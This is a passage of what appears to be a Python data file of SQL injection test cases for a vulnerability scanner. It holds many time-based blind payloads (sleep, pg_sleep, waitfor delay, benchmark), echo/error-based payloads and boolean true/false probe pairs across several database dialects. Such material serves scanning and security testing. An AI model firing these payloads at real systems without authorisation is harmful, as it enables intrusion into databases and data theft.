        "input": ") AS rndstr WHERE \"rndstr\"=\"rndstr\" OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020233,
        "input": ") AS rndstr WHERE \"rndstr\"=\"rndstr\" AND sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020232,
        "input": ") AS rndstr WHERE \"rndstr\"=\"rndstr\" AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020231,
        "input": ") AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020229,
        "input": "(select(0) from (select(sleep(duration)))v)/*'(select(0) from (select(sleep(duration)))v)+'\"+(select(0) from (select(sleep(duration)))v)+\"*/",
        "encode":  "YES",
    },

    {
        "case_id": 1100020230,
        "input": ") AND (SELECT * FROM (SELECT(sleep(duration))))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020228,
        "input": "(SELECT * FROM (SELECT(sleep(duration))))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020221,
        "input": "'||(SELECT 'rndstr' WHERE \"rndstr\"=\"rndstr\" AND sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020222,
        "input": "'||(SELECT 'rndstr' WHERE \"rndstr\"=\"rndstr\" OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020223,
        "input": "'||(SELECT 'rndstr' WHERE \"rndstr\"=\"rndstr\" OR sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020224,
        "input": "'||(SELECT 'rndstr' WHERE \"rndstr\"=\"rndstr\" RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020225,
        "input": "'||(SELECT 'rndstr' WHERE \"rndstr\"=\"rndstr\" RLIKE sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020226,
        "input": "(\"rndstr\"=\"rndstr\" AND sleep(duration))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020227,
        "input": "(SELECT (CASE WHEN (\"rndstr\"=\"rndstr\") THEN sleep(duration) ELSE rndstr*(SELECT rndstr FROM INFORMATION_SCHEMA.CHARACTER_) END))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020218,
        "input": "'||(SELECT 'rndstr' FROM DUAL WHERE \"rndstr\"=\"rndstr\" RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020219,
        "input": "'||(SELECT 'rndstr' FROM DUAL WHERE \"rndstr\"=\"rndstr\" RLIKE sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020220,
        "input": "'||(SELECT 'rndstr' WHERE \"rndstr\"=\"rndstr\" AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020214,
        "input": "'||(SELECT 'rndstr' FROM DUAL WHERE \"rndstr\"=\"rndstr\" AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020215,
        "input": "'||(SELECT 'rndstr' FROM DUAL WHERE \"rndstr\"=\"rndstr\" AND sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020216,
        "input": "'||(SELECT 'rndstr' FROM DUAL WHERE \"rndstr\"=\"rndstr\" OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020217,
        "input": "'||(SELECT 'rndstr' FROM DUAL WHERE \"rndstr\"=\"rndstr\" OR sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020209,
        "input": "'+or+sleep(duration)%23",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020210,
        "input": "',(SELECT (CASE WHEN (\"rndstr\"=\"rndstr\") THEN sleep(duration) ELSE rndstr*(SELECT rndstr FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020211,
        "input": "'/**/And/**/if(now()=sysdate(),sleep(duration),0)/**/and/**/'1",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020212,
        "input": "'And(if(now()=sysdate(),sleep(duration),0))and'1",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020213,
        "input": "'val;select pg_sleep(duration); --",
        "encode":  "YES",
    },

    {
        "case_id": 1100020208,
        "input": "'+(SELECT rndstr WHERE \"rndstr\"=\"rndstr\" RLIKE sleep(duration))+'",
        "encode":  "YES",
    },

    {
        "case_id": 1100020202,
        "input": "'+(SELECT rndstr WHERE \"rndstr\"=\"rndstr\" OR (SELECT * FROM (SELECT(sleep(duration)))))+'",
        "encode":  "YES",
    },

    {
        "case_id": 1100020203,
        "input": "'+(SELECT rndstr WHERE \"rndstr\"=\"rndstr\" OR sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020204,
        "input": "'+(SELECT rndstr WHERE \"rndstr\"=\"rndstr\" OR sleep(duration))+'",
        "encode":  "YES",
    },

    {
        "case_id": 1100020205,
        "input": "'+(SELECT rndstr WHERE \"rndstr\"=\"rndstr\" RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020206,
        "input": "'+(SELECT rndstr WHERE \"rndstr\"=\"rndstr\" RLIKE (SELECT * FROM (SELECT(sleep(duration)))))+'",
        "encode":  "YES",
    },

    {
        "case_id": 1100020207,
        "input": "'+(SELECT rndstr WHERE \"rndstr\"=\"rndstr\" RLIKE sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020199,
        "input": "'+(SELECT rndstr WHERE \"rndstr\"=\"rndstr\" AND sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020200,
        "input": "'+(SELECT rndstr WHERE \"rndstr\"=\"rndstr\" AND sleep(duration))+'",
        "encode":  "YES",
    },

    {
        "case_id": 1100020201,
        "input": "'+(SELECT rndstr WHERE \"rndstr\"=\"rndstr\" OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020195,
        "input": "'+(SELECT 'rndstr' WHERE \"rndstr\"=\"rndstr\" RLIKE sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020196,
        "input": "'+(SELECT 'rndstr' WHERE \"rndstr\"=\"rndstr\" RLIKE sleep(duration))+'",
        "encode":  "YES",
    },

    {
        "case_id": 1100020197,
        "input": "'+(SELECT rndstr WHERE \"rndstr\"=\"rndstr\" AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020198,
        "input": "'+(SELECT rndstr WHERE \"rndstr\"=\"rndstr\" AND (SELECT * FROM (SELECT(sleep(duration)))))+'",
        "encode":  "YES",
    },

    {
        "case_id": 1100020194,
        "input": "'+(SELECT 'rndstr' WHERE \"rndstr\"=\"rndstr\" RLIKE (SELECT * FROM (SELECT(sleep(duration)))))+'",
        "encode":  "YES",
    },

    {
        "case_id": 1100020193,
        "input": "'+(SELECT 'rndstr' WHERE \"rndstr\"=\"rndstr\" RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020192,
        "input": "'+(SELECT 'rndstr' WHERE \"rndstr\"=\"rndstr\" OR sleep(duration))+'",
        "encode":  "YES",
    },

    {
        "case_id": 1100020191,
        "input": "'+(SELECT 'rndstr' WHERE \"rndstr\"=\"rndstr\" OR sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020190,
        "input": "'+(SELECT 'rndstr' WHERE \"rndstr\"=\"rndstr\" OR (SELECT * FROM (SELECT(sleep(duration)))))+'",
        "encode":  "YES",
    },

    {
        "case_id": 1100020189,
        "input": "'+(SELECT 'rndstr' WHERE \"rndstr\"=\"rndstr\" OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020188,
        "input": "'+(SELECT 'rndstr' WHERE \"rndstr\"=\"rndstr\" AND sleep(duration))+'",
        "encode":  "YES",
    },

    {
        "case_id": 1100020187,
        "input": "'+(SELECT 'rndstr' WHERE \"rndstr\"=\"rndstr\" AND sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020186,
        "input": "'+(SELECT 'rndstr' WHERE \"rndstr\"=\"rndstr\" AND (SELECT * FROM (SELECT(sleep(duration)))))+'",
        "encode":  "YES",
    },

    {
        "case_id": 1100020185,
        "input": "'+(SELECT 'rndstr' WHERE \"rndstr\"=\"rndstr\" AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020178,
        "input": "')) AS rndstr WHERE \"rndstr\"=\"rndstr\" AND sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020179,
        "input": "')) AS rndstr WHERE \"rndstr\"=\"rndstr\" OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020180,
        "input": "')) AS rndstr WHERE \"rndstr\"=\"rndstr\" OR sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020181,
        "input": "')) AS rndstr WHERE \"rndstr\"=\"rndstr\" RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020182,
        "input": "')) AS rndstr WHERE \"rndstr\"=\"rndstr\" RLIKE sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020183,
        "input": "')) OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020184,
        "input": "')) RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020172,
        "input": "') WHERE \"rndstr\"=\"rndstr\" OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020173,
        "input": "') WHERE \"rndstr\"=\"rndstr\" OR sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020174,
        "input": "') WHERE \"rndstr\"=\"rndstr\" RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020175,
        "input": "') WHERE \"rndstr\"=\"rndstr\" RLIKE sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020176,
        "input": "')) AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020177,
        "input": "')) AS rndstr WHERE \"rndstr\"=\"rndstr\" AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020171,
        "input": "') WHERE \"rndstr\"=\"rndstr\" AND sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020170,
        "input": "') WHERE \"rndstr\"=\"rndstr\" AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020168,
        "input": "') RLIKE (SELECT * FROM (SELECT(sleep(duration))))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020169,
        "input": "') RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020166,
        "input": "') OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020167,
        "input": "') RLIKE (SELECT * FROM (SELECT(SLEEP(duration-(IF(\"rndstr\"=\"rndstr\",0,duration))))))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020156,
        "input": "' and 1=2 or sleep(duration) and '1'='1",
        "encode":  "YES",
    },

    {
        "case_id": 1100020157,
        "input": "') AND (SELECT * FROM (SELECT(sleep(duration))))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020158,
        "input": "') AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020159,
        "input": "') AS rndstr WHERE \"rndstr\"=\"rndstr\" AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020160,
        "input": "') AS rndstr WHERE \"rndstr\"=\"rndstr\" AND sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020161,
        "input": "') AS rndstr WHERE \"rndstr\"=\"rndstr\" OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020162,
        "input": "') AS rndstr WHERE \"rndstr\"=\"rndstr\" OR sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020163,
        "input": "') AS rndstr WHERE \"rndstr\"=\"rndstr\" RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020164,
        "input": "') AS rndstr WHERE \"rndstr\"=\"rndstr\" RLIKE sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020165,
        "input": "') OR (SELECT * FROM (SELECT(sleep(duration))))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020155,
        "input": "' WHERE \"rndstr\"=\"rndstr\" RLIKE sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020154,
        "input": "' WHERE \"rndstr\"=\"rndstr\" RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020153,
        "input": "' WHERE \"rndstr\"=\"rndstr\" OR sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020151,
        "input": "' WHERE \"rndstr\"=\"rndstr\" AND sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020152,
        "input": "' WHERE \"rndstr\"=\"rndstr\" OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020143,
        "input": "' IN BOOLEAN ) OR sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020144,
        "input": "' IN BOOLEAN ) RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020145,
        "input": "' IN BOOLEAN ) RLIKE sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020150,
        "input": "' WHERE \"rndstr\"=\"rndstr\" AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020149,
        "input": "' RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020148,
        "input": "' RLIKE (SELECT * FROM (SELECT(sleep(duration))))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020146,
        "input": "' OR (SELECT * FROM (SELECT(sleep(duration))))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020147,
        "input": "' OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020142,
        "input": "' IN BOOLEAN ) OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020140,
        "input": "' IN BOOLEAN ) AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020141,
        "input": "' IN BOOLEAN ) AND sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020139,
        "input": "' AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020138,
        "input": "' AND (SELECT * FROM (SELECT(sleep(duration))))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020126,
        "input": "%') RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020127,
        "input": "%')) AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020128,
        "input": "%')) OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020129,
        "input": "%')) RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020130,
        "input": "%'/**/And/**/if(now()=sysdate(),sleep(duration),0)/**/and/**/'1",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020131,
        "input": "%'And(if(now()=sysdate(),sleep(duration),0))and'1",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020121,
        "input": "%' OR (SELECT * FROM (SELECT(SLEEP(duration-(IF(\"rndstr\"=\"rndstr\",0,duration))))A)B)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020137,
        "input": "%bf'/**/Or/**/if(now()=sysdate(),sleep(duration),0)%3d0/**/limit/**/1%23",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020136,
        "input": "%bf' Or if(now()=sysdate(),sleep(duration),0)%3d0 limit 1%23",
        "encode":  "YES",
    },

    {
        "case_id": 1100020135,
        "input": "%bf'     Or      if(now()=sysdate(),sleep(duration),0)%3d0        limit   1%23",
        "encode":  "YES",
    },

    {
        "case_id": 1100020134,
        "input": "%bf\"/**/Or/**/if(now()=sysdate(),sleep(duration),0)%3d0/**/limit/**/1%23",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020133,
        "input": "%bf\" Or if(now()=sysdate(),sleep(duration),0)%3d0 limit 1%23",
        "encode":  "YES",
    },

    {
        "case_id": 1100020132,
        "input": "%bf\"     Or      if(now()=sysdate(),sleep(duration),0)%3d0        limit   1%23",
        "encode":  "YES",
    },

    {
        "case_id": 1100020125,
        "input": "%') OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020123,
        "input": "%' RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020124,
        "input": "%') AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020122,
        "input": "%' OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020119,
        "input": "%%bf'And(if(now()=sysdate(),sleep(duration),0))%23",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020120,
        "input": "%' AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020116,
        "input": "%\"And(if(now()=sysdate(),sleep(duration),0))and\"1",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020117,
        "input": "%%bf\"And(if(now()=sysdate(),sleep(duration),0))%23",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020118,
        "input": "%%bf'/**/And/**/if(now()=sysdate(),sleep(duration),0)/**/%23",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020115,
        "input": "%\"/**/And/**/if(now()=sysdate(),sleep(duration),0)/**/and/**/\"1",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020114,
        "input": "%\")) RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020113,
        "input": "%\")) OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020112,
        "input": "%\")) AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020105,
        "input": "\"val;waitfor delay '0:0:duration' --",
        "encode":  "YES",
    },

    {
        "case_id": 1100020106,
        "input": "%\" AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020101,
        "input": "\")) OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020102,
        "input": "\")) RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020103,
        "input": "\"/**/And/**/if(now()=sysdate(),sleep(duration),0)/**/and/**/\"1",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020111,
        "input": "%\") RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020110,
        "input": "%\") OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020109,
        "input": "%\") AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020108,
        "input": "%\" RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020107,
        "input": "%\" OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020104,
        "input": "\"And(if(now()=sysdate(),sleep(duration),0))and\"1",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020097,
        "input": "\")) AS rndstr WHERE \"rndstr\"=\"rndstr\" OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020098,
        "input": "\")) AS rndstr WHERE \"rndstr\"=\"rndstr\" OR sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020099,
        "input": "\")) AS rndstr WHERE \"rndstr\"=\"rndstr\" RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020100,
        "input": "\")) AS rndstr WHERE \"rndstr\"=\"rndstr\" RLIKE sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020096,
        "input": "\")) AS rndstr WHERE \"rndstr\"=\"rndstr\" AND sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020095,
        "input": "\")) AS rndstr WHERE \"rndstr\"=\"rndstr\" AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020094,
        "input": "\")) AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020093,
        "input": "\") WHERE \"rndstr\"=\"rndstr\" RLIKE sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020090,
        "input": "\") WHERE \"rndstr\"=\"rndstr\" OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020091,
        "input": "\") WHERE \"rndstr\"=\"rndstr\" OR sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020092,
        "input": "\") WHERE \"rndstr\"=\"rndstr\" RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020089,
        "input": "\") WHERE \"rndstr\"=\"rndstr\" AND sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020085,
        "input": "\") AS rndstr WHERE \"rndstr\"=\"rndstr\" RLIKE sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020086,
        "input": "\") OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020088,
        "input": "\") WHERE \"rndstr\"=\"rndstr\" AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020087,
        "input": "\") RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020084,
        "input": "\") AS rndstr WHERE \"rndstr\"=\"rndstr\" RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020079,
        "input": "\") AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020080,
        "input": "\") AS rndstr WHERE \"rndstr\"=\"rndstr\" AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020081,
        "input": "\") AS rndstr WHERE \"rndstr\"=\"rndstr\" AND sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020082,
        "input": "\") AS rndstr WHERE \"rndstr\"=\"rndstr\" OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020083,
        "input": "\") AS rndstr WHERE \"rndstr\"=\"rndstr\" OR sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020077,
        "input": "\" WHERE \"rndstr\"=\"rndstr\" RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020078,
        "input": "\" WHERE \"rndstr\"=\"rndstr\" RLIKE sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020076,
        "input": "\" WHERE \"rndstr\"=\"rndstr\" OR sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020075,
        "input": "\" WHERE \"rndstr\"=\"rndstr\" OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020074,
        "input": "\" WHERE \"rndstr\"=\"rndstr\" AND sleep(duration)#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020073,
        "input": "\" WHERE \"rndstr\"=\"rndstr\" AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020072,
        "input": "\" RLIKE (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020071,
        "input": "\" RLIKE (SELECT * FROM (SELECT(sleep(duration))))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020069,
        "input": "\" OR (SELECT * FROM (SELECT(sleep(duration))))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020070,
        "input": "\" OR (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020068,
        "input": "\" AND (SELECT * FROM (SELECT(sleep(duration))))#",
        "encode":  "YES",
    },

    {
        "case_id": 1100020066,
        "input": "And if(now()=sysdate(),sleep(duration),0)",
        "encode":  "YES",
    },

    {
        "case_id": 1100020067,
        "input": "\" AND (SELECT * FROM (SELECT(sleep(duration))))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020340,
        "input": "%bf'And(BenchMark(duration*2000000,sha1(1)))%23",
        "encode":  "ALL",
    },

]

sql_inject_detect_echo_test_cases = [

    {
        "case_id": 1100020326,
        "input": "%2528SELECT%2520CASE%2520WHEN%2520%2528num%253Dnum%252b2%2529%2520THEN%2520val%2520ELSE%2520num%2520%252a%2520%2528select%2520num%2520from%2520%2528select%25201%2520union%2520select%25202%2529%2520a%2520limit%25201%2529%2520end%2529",
        "encode":  "ALL",
    },

    {
        "case_id": 1100020061,
        "input": "(SELECT (CASE WHEN (num=num+2) THEN val ELSE num * (SELECT num FROM mysql.db) END))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020059,
        "input": "(SELECT CASE WHEN (num=num+2) THEN val ELSE num * (select num from (select 1 union select 2) a limit 1) end)",
        "encode":  "YES",
    },

    {
        "case_id": 1100020060,
        "input": "(SELECT (CASE WHEN (num=num+2) THEN val ELSE num * (SELECT num FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))",
        "encode":  "YES",
    },

    {
        "case_id": 1100020062,
        "input": "(select 1 and row(1,1)>(select count(*),concat(concat(CHAR(52),CHAR(67),CHAR(117),CHAR(111),CHAR(65),CHAR(81),CHAR(117),CHAR(69),CHAR(51),CHAR(53),CHAR(115)),floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))",
        "encode":  "YES",
    },

]


sql_inject_detect_boolean_test_cases = [

    {
        "case_id": 1100020001,
        "false_case" : "-1 or num=0",
        "confirm_true_case" :  "-1 or num-(num-2)=2",
        "confirm_false_case" : "-1 or num=(num-2)",
        "true_case" : "-1 or num=num",
        "encode":  "YES",
    },

    {
        "case_id": 1100020002,
        "false_case" : "-1' or 'num'='0",
        "confirm_true_case" :  "-1' or 'num-(num-2)'='2",
        "confirm_false_case" : "-1' or 'num'='(num-2)",
        "true_case" : "-1' or 'num'='num",
        "encode":  "YES",
    },

    {
        "case_id": 1100020003,
        "false_case" : "-1\" or \"num\"=\"0",
        "confirm_true_case" :  "-1\" or \"num-(num-2)\"=\"2",
        "confirm_false_case" : "-1\" or \"num\"=\"(num-2)",
        "true_case" : "-1\" or \"num\"=\"num",
        "encode":  "YES",
    },

    {
        "case_id": 1100020004,
        "confirm_true_case" :  "val' and '(num-2)'='(num-2)",
        "use_orig_body" : "yes",
        "false_case" : "val' and 'num'='0",
        "confirm_false_case" : "val' and '(num-2)'='(num-1)",
        "true_case" : "val' and 'num'='num'",
        "encode":  "YES",
    },

    {
        "case_id": 1100020005,
        "confirm_true_case" :  "val\" and \"(num-2)\"=\"(num-2)",
        "use_orig_body" : "yes",
        "false_case" : "val\" and \"num\"=\"0",
        "confirm_false_case" : "val\" and \"(num-2)\"=\"(num-1)",
        "true_case" : "val\" and \"num\"=\"num\"",
        "encode":  "YES",
    },

    {
        "case_id": 1100020006,
        "confirm_true_case" :  "val/**/and/**/(num-1)=(num-1)",
        "use_orig_body" : "yes",
        "false_case" : "val/**/and/**/num=0",
        "confirm_false_case" : "val/**/and/**/(num-1)=(num-2)",
        "true_case" : "val/**/and/**/num=num",
        "encode":  "YES",
    },

    {
        "case_id": 1100020007,
        "confirm_true_case" :  "1 and 1=(case when(1=1 and num-1=num-1) then 1 else (select 1 union select 2) end)",
        "use_orig_body" : "yes",
        "false_case" : "1 and 1=(case when(1=1 and num=num-1) then 1 else (select 1 union select 2) end)",
        "confirm_false_case" : "1 and 1=(case when(1=1 and num-1=num-2) then 1 else (select 1 union select 2) end)",
        "true_case" : "1 and 1=(case when(1=1 and num=num) then 1 else (select 1 union select 2) end)",
        "encode":  "YES",
    },

    {
